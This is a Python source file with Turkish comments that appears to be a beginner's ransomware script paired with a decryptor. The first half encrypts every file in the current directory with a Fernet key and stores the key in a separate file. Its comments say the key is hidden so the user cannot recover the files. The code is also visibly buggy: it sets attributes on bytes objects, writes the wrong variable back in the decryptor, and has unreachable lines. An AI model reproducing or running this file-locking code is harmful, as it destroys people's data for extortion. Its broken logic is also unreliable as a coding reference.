
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "whatsup.py" or file =="thekey.key":
        continue
        files.append(file)


    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
#print(key) bunu yaparsan kullanıcıya şiferyi verirsin ama biz bunu vermek istemeyiz
#anahtarı yani şifreyi saklamamız gerekiyor bunun için anahtarı bir dosyaya kaydedelim
with open("thekey.key","wb") as thekey:
    thekey.write(key)

#şimdi bazı dosyaları kilitleyeceğiz ve bunu for ile yapıyoruz
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()

    contents.encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:  #şuan da açtığımız dosyanın içeriğini bu değişkenin içeriğine kaydedin
        thefile.write(contents.encrypted)   # şifrelenmiş bir dosya olarak dosyaya geri yazacak

import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "whatsup.py" or file == "thekey.key" or file == "decrypt.py":
        continue
        files.append(file)

    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

# şimdi bazı dosyaları kilitleyeceğiz ve bunu for ile yapıyoruz
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()

    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, "wb") as thefile:  # şuan da açtığımız dosyanın içeriğini bu değişkenin içeriğine kaydedin
        thefile.write(contents.decrypted)  # şifrelenmiş bir dosya olarak dosyaya geri yazacak

